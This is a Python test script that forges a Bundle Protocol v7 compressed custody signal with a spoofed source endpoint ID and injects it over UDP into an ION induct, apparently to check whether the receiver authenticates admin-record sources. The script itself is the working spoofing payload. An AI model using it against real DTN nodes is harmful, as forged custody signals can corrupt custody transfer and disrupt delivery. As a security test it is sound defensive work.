#!/usr/bin/env python3
"""Forge a CBR compressed custody signal (CCS) with an arbitrary source EID and
send it to an ION udpcli induct, to test admin-record source authentication.

The CCS administrative record is [13, {disposition: [[seqId, seqNum, length]]}],
matching cbr_encodeCcs()/cbr_decodeBundleSequence(): a 3-element bundle sequence
(no block-source AEID, so the receiver substitutes its own admin EID as the
custody-key source).

Exit 2 (skip) if bespokebpv7 is unavailable.
"""
import argparse
import socket
import sys


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--induct-host", default="127.0.0.1")
    ap.add_argument("--induct-port", type=int, required=True)
    ap.add_argument("--source", required=True, help="forged primary-block source EID")
    ap.add_argument("--dest", required=True, help="receiver admin endpoint, e.g. ipn:1.0")
    ap.add_argument("--seq-id", type=int, required=True)
    ap.add_argument("--seq-num", type=int, required=True)
    ap.add_argument("--length", type=int, default=1)
    ap.add_argument("--disposition", type=int, default=1,
                    help="1 = custody accepted, -1 = refused")
    args = ap.parse_args()

    try:
        import cbor2
        from bespokebpv7.bpv7 import BPv7
        from bespokebpv7.block_enum import CRCType
    except Exception as exc:  # noqa: BLE001
        sys.stderr.write("SKIP: bespokebpv7 unavailable: %s\n" % exc)
        return 2

    # Admin record: [13 (CCS), {disposition: [[seqId, seqNum, length]]}]
    content = {args.disposition: [[args.seq_id, args.seq_num, args.length]]}
    payload = cbor2.dumps([13, content])

    bundle = BPv7()
    bundle.primary_block.route.source_eid = args.source
    bundle.primary_block.route.dest_eid = args.dest
    bundle.primary_block.route.report_to = args.source
    bundle.primary_block.adu_is_admin = True
    bundle.primary_block.set_creation()
    bundle.primary_block.crc_type = CRCType.CRC16
    bundle.primary_block.update_crc()
    bundle.add_payload_block(payload)

    wire = bytes(bundle)
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
        sock.sendto(wire, (args.induct_host, args.induct_port))
    sys.stderr.write("injected CCS: %d bytes src=%s dest=%s seqId=%d seqNum=%d disp=%d\n"
                     % (len(wire), args.source, args.dest, args.seq_id,
                        args.seq_num, args.disposition))
    return 0


if __name__ == "__main__":
    sys.exit(main())
